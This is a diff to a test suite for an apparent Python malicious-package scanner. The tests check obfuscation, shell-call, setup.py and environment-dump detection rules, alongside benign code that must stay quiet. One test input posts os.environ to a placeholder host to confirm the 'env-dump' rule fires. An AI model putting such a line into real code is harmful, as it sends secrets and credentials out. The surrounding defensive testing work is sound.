@@ -135,7 +135,14 @@ def test_steals_browser_passwords():
 def test_obfuscator_markers():
     armor = "from pyarmor_runtime_000000 import __pyarmor__\n__pyarmor__(__name__, __file__, b'x')"
     assert "obfuscated" in rules(armor)
-    assert "obfuscated" in rules("IlIlIlIlIl = 1\nlIlIlIlIlI = IlIlIlIlIl")
+    names = ["IlIlIlIl", "lIlIlIlI", "IIlIIlII", "llIIllII", "IlllIlll", "OO0O0OO0"]
+    assert "obfuscated" in rules("\n".join(f"{n} = 1" for n in names))
+    assert "obfuscated" in rules("import os\n" + "\n".join(f"{n} = os" for n in names))
+
+
+def test_lines_of_underscores_are_not_obfuscation():
+    line = "_" * 40
+    assert rules(f"# {line}\nx = 1\n\"\"\"\n{line}\n\"\"\"\nimport os") == []
 
 
 def test_big_encoded_blob():
@@ -157,6 +164,41 @@ def test_absurdly_deep_code_does_not_crash_the_scan():
     assert rules(nested) == []
 
 
+def test_main_guard_doesnt_run_on_import():
+    found = scan('''
+        import subprocess
+        if __name__ == "__main__":
+            subprocess.run(["make"])
+    ''', role="import")
+    assert [f.rule for f in found] == ["shell"]
+
+
+def test_build_tools_in_setup_are_only_a_weak_sign():
+    found = rules('''
+        import subprocess, sys
+        sha = subprocess.check_output(["git", "rev-parse", "HEAD"])
+        subprocess.check_call([sys.executable, "-m", "pip", "--version"])
+        subprocess.run("cmake --build .", shell=True)
+    ''', role="setup")
+    assert found == ["shell"]
+
+
+def test_environment_handed_to_a_subprocess_is_fine():
+    found = rules('''
+        import os, subprocess, requests
+        env = os.environ.copy()
+        env["X"] = "1"
+        subprocess.run(["tool"], env=env)
+        requests.get("https://api.example.com")
+    ''')
+    assert "env-dump" not in found
+
+
+def test_environment_posted_directly():
+    found = rules("import os, requests\nrequests.post('https://x.example', json=os.environ)")
+    assert "env-dump" in found
+
+
 # Normal code that must stay quiet.
 
 @pytest.mark.parametrize(
@@ -165,6 +207,9 @@ def test_absurdly_deep_code_does_not_crash_the_scan():
         # reading the version this way is common in setup.py
         'exec(open("mypkg/version.py").read())',
         'with open("mypkg/__about__.py") as f:\n    exec(f.read(), about)',
+        'from pathlib import Path\nexec(Path("pkg/release.py").read_text())',
+        'from setuptools import setup\nfrom setuptools.command.sdist import sdist\n'
+        'class S(sdist):\n    pass\nsetup(name="x", cmdclass={"sdist": S})',
         # building C extensions
         'from setuptools import setup\nfrom setuptools.command.build_ext import build_ext\n'
         'class B(build_ext):\n    pass\nsetup(name="x", cmdclass={"build_ext": B})',
